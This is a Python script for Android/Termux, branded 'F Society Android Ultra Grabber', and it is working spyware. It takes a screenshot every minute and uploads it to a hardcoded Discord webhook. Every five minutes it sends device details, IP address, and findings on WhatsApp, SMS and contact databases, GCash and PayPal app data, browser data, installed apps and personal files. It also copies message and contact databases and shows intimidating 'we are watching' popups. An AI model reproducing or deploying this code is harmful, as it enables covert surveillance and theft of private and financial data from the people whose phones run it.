#!/data/data/com.termux/files/usr/bin/python
import os
import sys
import subprocess
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import requests
import re
from datetime import datetime
from pathlib import Path

# ==================== INSTALL REQUIRED MODULES ====================
def install_modules():
    modules = ['requests']
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.run(['pip', 'install', module, '--quiet'], capture_output=True)

install_modules()

# ==================== CONFIGURATION ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
SCREENSHOT_INTERVAL = 60

running = True

# ==================== TERMUX TERMINAL POPUP (F SOCIETY MESSAGE) ====================
def show_termux_popup():
    """Show popup message in Termux using dialog/toast"""
    messages = [
        "🔴 F SOCIETY IS WATCHING",
        "⚠️ We are always watching",
        "👁️ Your data is being collected",
        "💀 F Society was here"
    ]
    
    for msg in messages:
        try:
            # Try dialog first
            subprocess.run(['dialog', '--msgbox', msg, '5', '40'], 
                          capture_output=True, timeout=2)
        except:
            try:
                # Try toast notification if dialog not available
                subprocess.run(['termux-toast', msg], capture_output=True)
            except:
                # Fallback to print
                print(f"\n[!] {msg}")
        time.sleep(3)

def message_box_looper():
    """Show popup messages continuously"""
    while running:
        show_termux_popup()
        time.sleep(5)  # Show every 5 seconds

# ==================== SCREENSHOT GRABBER (ANDROID) ====================
def take_screenshot():
    """Take screenshot on Android using screencap"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = f"/sdcard/screenshot_{timestamp}.png"
        
        # Take screenshot
        subprocess.run(['screencap', '-p', screenshot_path], capture_output=True)
        
        if os.path.exists(screenshot_path):
            # Read file as bytes
            with open(screenshot_path, 'rb') as f:
                img_bytes = f.read()
            
            # Send to webhook
            files = {'file': (f'screenshot_{timestamp}.png', img_bytes, 'image/png')}
            requests.post(WEBHOOK_URL, files=files, timeout=30)
            print(f"[+] Screenshot sent: {screenshot_path}")
            
            # Clean up
            os.remove(screenshot_path)
            return True
    except Exception as e:
        print(f"[-] Screenshot error: {e}")
    return False

def screenshot_loop():
    """Take screenshots every minute"""
    while running:
        take_screenshot()
        time.sleep(SCREENSHOT_INTERVAL)

# ==================== WHATSAPP GRABBER ====================
def get_whatsapp_data():
    """Extract WhatsApp data from Android"""
    whatsapp_data = []
    
    # WhatsApp databases
    whatsapp_paths = [
        "/sdcard/WhatsApp/Databases/msgstore.db",
        "/sdcard/WhatsApp/Databases/wa.db",
        "/data/data/com.whatsapp/databases/msgstore.db",
        "/data/data/com.whatsapp/databases/wa.db",
    ]
    
    for path in whatsapp_paths:
        try:
            if os.path.exists(path):
                whatsapp_data.append(f"📱 WhatsApp DB found: {path}")
                # Try to copy if readable
                try:
                    shutil.copy2(path, f"/sdcard/msgstore_backup_{datetime.now().strftime('%Y%m%d')}.db")
                    whatsapp_data.append(f"   Backup created: msgstore_backup_{datetime.now().strftime('%Y%m%d')}.db")
                except:
                    pass
        except:
            pass
    
    return whatsapp_data

# ==================== GCASH GRABBER ====================
def get_gcash_data():
    """Extract GCash data from Android"""
    gcash_data = []
    
    # GCash directories
    gcash_paths = [
        "/sdcard/GCash",
        "/sdcard/Android/data/com.globe.gcash.android",
        "/data/data/com.globe.gcash.android",
    ]
    
    for path in gcash_paths:
        try:
            if os.path.exists(path):
                gcash_data.append(f"📱 GCash data found: {path}")
                
                # List files in directory
                for root, dirs, files in os.walk(path):
                    for file in files[:10]:
                        if file.endswith('.db') or file.endswith('.json') or file.endswith('.log'):
                            gcash_data.append(f"   📄 {file}")
        except:
            pass
    
    # Check for GCash screenshots
    ss_path = "/sdcard/Pictures/Screenshots"
    if os.path.exists(ss_path):
        for file in os.listdir(ss_path):
            if 'gcash' in file.lower():
                gcash_data.append(f"📸 GCash screenshot: {file}")
    
    return gcash_data

# ==================== PAYPAL GRABBER ====================
def get_paypal_data():
    """Extract PayPal data from Android"""
    paypal_data = []
    
    # PayPal directories
    paypal_paths = [
        "/sdcard/PayPal",
        "/data/data/com.paypal.android.p2pmobile",
        "/sdcard/Android/data/com.paypal.android.p2pmobile",
    ]
    
    for path in paypal_paths:
        try:
            if os.path.exists(path):
                paypal_data.append(f"💰 PayPal data found: {path}")
                
                # List files
                for root, dirs, files in os.walk(path):
                    for file in files[:10]:
                        paypal_data.append(f"   📄 {file}")
        except:
            pass
    
    return paypal_data

# ==================== BROWSER DATA GRABBER ====================
def get_browser_data():
    """Extract browser data (Chrome, Firefox, Kiwi)"""
    browser_data = []
    
    # Chrome on Android
    chrome_paths = [
        "/data/data/com.android.chrome/app_chrome/Default",
        "/sdcard/Android/data/com.android.chrome",
        "/storage/emulated/0/Android/data/com.android.chrome",
    ]
    
    for path in chrome_paths:
        try:
            if os.path.exists(path):
                browser_data.append(f"🌐 Chrome data: {path}")
        except:
            pass
    
    return browser_data

# ==================== SMS GRABBER ====================
def get_sms_data():
    """Extract SMS messages (requires permissions)"""
    sms_data = []
    
    try:
        # Try to access SMS database (requires root)
        sms_db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        
        if os.path.exists(sms_db_path):
            sms_data.append("📱 SMS Database found")
            
            # Try to copy
            try:
                shutil.copy2(sms_db_path, f"/sdcard/sms_backup_{datetime.now().strftime('%Y%m%d')}.db")
                sms_data.append(f"   Backup created: sms_backup_{datetime.now().strftime('%Y%m%d')}.db")
            except:
                pass
    except:
        pass
    
    return sms_data

# ==================== CONTACTS GRABBER ====================
def get_contacts():
    """Extract contacts"""
    contacts_data = []
    
    try:
        # Contacts database
        contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        
        if os.path.exists(contacts_path):
            contacts_data.append("📇 Contacts database found")
            try:
                shutil.copy2(contacts_path, f"/sdcard/contacts_backup_{datetime.now().strftime('%Y%m%d')}.db")
                contacts_data.append(f"   Backup created: contacts_backup_{datetime.now().strftime('%Y%m%d')}.db")
            except:
                pass
    except:
        pass
    
    return contacts_data

# ==================== FILE GRABBER (SENSITIVE FILES) ====================
def get_sensitive_files():
    """Find sensitive files on device"""
    sensitive_files = []
    
    # Common sensitive file patterns
    patterns = [
        '*.txt', '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx',
        '*.jpg', '*.png', '*.mp4', '*.zip', '*.rar', '*.7z',
        '*.log', '*.json', '*.xml', '*.db', '*.sqlite'
    ]
    
    # Search paths
    search_paths = [
        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/Pictures",
        "/sdcard/Movies",
        "/sdcard/Music",
        "/sdcard/DCIM",
    ]
    
    for search_path in search_paths:
        try:
            if os.path.exists(search_path):
                for root, dirs, files in os.walk(search_path):
                    for file in files[:20]:  # Limit to 20 files per folder
                        file_path = os.path.join(root, file)
                        file_size = os.path.getsize(file_path) / (1024 * 1024)  # Size in MB
                        
                        # Only grab files under 10MB
                        if file_size < 10:
                            sensitive_files.append(f"📄 {file_path} ({file_size:.1f}MB)")
        except:
            pass
    
    return sensitive_files[:100]  # Limit to 100 files

# ==================== APP LIST GRABBER ====================
def get_installed_apps():
    """Get list of installed apps"""
    apps = []
    
    try:
        result = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True)
        if result.returncode == 0:
            packages = result.stdout.strip().split('\n')
            for pkg in packages[:50]:  # Limit to 50
                apps.append(f"📦 {pkg.replace('package:', '')}")
    except:
        pass
    
    return apps

# ==================== SYSTEM INFO GRABBER ====================
def get_system_info():
    """Collect Android system information"""
    info = {}
    
    # Device info
    try:
        result = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True)
        info['manufacturer'] = result.stdout.strip()
    except:
        info['manufacturer'] = 'Unknown'
    
    try:
        result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True)
        info['model'] = result.stdout.strip()
    except:
        info['model'] = 'Unknown'
    
    try:
        result = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True)
        info['android_version'] = result.stdout.strip()
    except:
        info['android_version'] = 'Unknown'
    
    # IP Address
    try:
        result = subprocess.run(['curl', '-s', 'https://api.ipify.org'], capture_output=True, text=True)
        info['ip'] = result.stdout.strip()
    except:
        info['ip'] = 'Unknown'
    
    # Storage info
    try:
        stat = os.statvfs('/sdcard')
        total = (stat.f_blocks * stat.f_frsize) / (1024 * 1024 * 1024)
        free = (stat.f_bfree * stat.f_frsize) / (1024 * 1024 * 1024)
        info['storage_total'] = f"{total:.1f}GB"
        info['storage_free'] = f"{free:.1f}GB"
    except:
        pass
    
    return info

# ==================== SEND TO WEBHOOK ====================
def send_to_webhook(content, file_bytes=None, filename=None):
    """Send data to Discord webhook"""
    try:
        if file_bytes and filename:
            files = {'file': (filename, file_bytes, 'application/octet-stream')}
            requests.post(WEBHOOK_URL, files=files, timeout=30)
        else:
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
        return True
    except Exception as e:
        print(f"Webhook error: {e}")
        return False

# ==================== COLLECT AND SEND ALL DATA ====================
def collect_and_send_all():
    """Collect all data and send to webhook"""
    print("\n[+] Collecting system information...")
    sys_info = get_system_info()
    
    message = f"**[🔴 F SOCIETY - ANDROID GRABBER - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"📱 Device: {sys_info.get('manufacturer', 'Unknown')} {sys_info.get('model', 'Unknown')}\n"
    message += f"🤖 Android: {sys_info.get('android_version', 'Unknown')}\n"
    message += f"🌐 IP: {sys_info.get('ip', 'Unknown')}\n"
    message += f"💾 Storage: {sys_info.get('storage_total', 'Unknown')} total, {sys_info.get('storage_free', 'Unknown')} free\n"
    message += f"{'='*60}\n\n"
    
    # WhatsApp Data
    print("[+] Grabbing WhatsApp data...")
    message += "**📱 WHATSAPP DATA:**\n"
    for data in get_whatsapp_data():
        message += f"{data}\n"
    message += "\n"
    
    # GCash Data
    print("[+] Grabbing GCash data...")
    message += "**📱 GCASH DATA:**\n"
    for data in get_gcash_data():
        message += f"{data}\n"
    message += "\n"
    
    # PayPal Data
    print("[+] Grabbing PayPal data...")
    message += "**💰 PAYPAL DATA:**\n"
    for data in get_paypal_data():
        message += f"{data}\n"
    message += "\n"
    
    # SMS Data
    print("[+] Grabbing SMS data...")
    message += "**💬 SMS DATA:**\n"
    for data in get_sms_data():
        message += f"{data}\n"
    message += "\n"
    
    # Contacts
    print("[+] Grabbing contacts...")
    message += "**📇 CONTACTS:**\n"
    for data in get_contacts():
        message += f"{data}\n"
    message += "\n"
    
    # Browser Data
    print("[+] Grabbing browser data...")
    message += "**🌐 BROWSER DATA:**\n"
    for data in get_browser_data():
        message += f"{data}\n"
    message += "\n"
    
    # Installed Apps
    print("[+] Grabbing installed apps...")
    message += "**📦 INSTALLED APPS:**\n"
    for app in get_installed_apps()[:30]:
        message += f"{app}\n"
    message += "\n"
    
    # Sensitive Files
    print("[+] Finding sensitive files...")
    message += "**📄 SENSITIVE FILES:**\n"
    for file in get_sensitive_files()[:30]:
        message += f"{file}\n"
    message += "\n"
    
    send_to_webhook(message)
    print("[+] All data sent to webhook!")

def continuous_collection_loop():
    """Collect data every 5 minutes"""
    while running:
        collect_and_send_all()
        time.sleep(300)  # Every 5 minutes

# ==================== MAIN FUNCTION ====================
def main():
    global running
    
    print("=" * 60)
    print("🔴 F SOCIETY - ANDROID ULTRA GRABBER")
    print("=" * 60)
    print("Non-destructive - Only collects data")
    print("=" * 60)
    print(f"📱 Device: {get_system_info().get('model', 'Unknown')}")
    print("=" * 60)
    
    # Check for required permissions
    print("\n[!] Make sure to grant permissions:")
    print("    - Storage access")
    print("    - If rooted, more data can be grabbed")
    print("=" * 60)
    
    # Send initial data
    collect_and_send_all()
    
    # Start continuous data collection
    print("[+] Starting continuous data collection (every 5 minutes)")
    Thread(target=continuous_collection_loop, daemon=True).start()
    
    # Start screenshot capture (if possible)
    print("[+] Screenshot capture active (every minute)")
    Thread(target=screenshot_loop, daemon=True).start()
    
    # Start message popups
    print("[+] F SOCIETY message popups active")
    Thread(target=message_box_looper, daemon=True).start()
    
    print("\n✅ ALL GRABBERS ACTIVE")
    print("📱 Grabbing: WhatsApp, GCash, PayPal")
    print("💬 Grabbing: SMS, Contacts, Browser data")
    print("📄 Grabbing: Files, Photos, Documents")
    print("📸 Screenshots every minute")
    print("🔔 Popup messages every 5 seconds")
    print("\n⚠️ Press Ctrl+C to stop\n")
    
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Stopping grabber...")
        running = False
        time.sleep(2)
        print("[+] Grabber stopped")

if __name__ == "__main__":
    main()
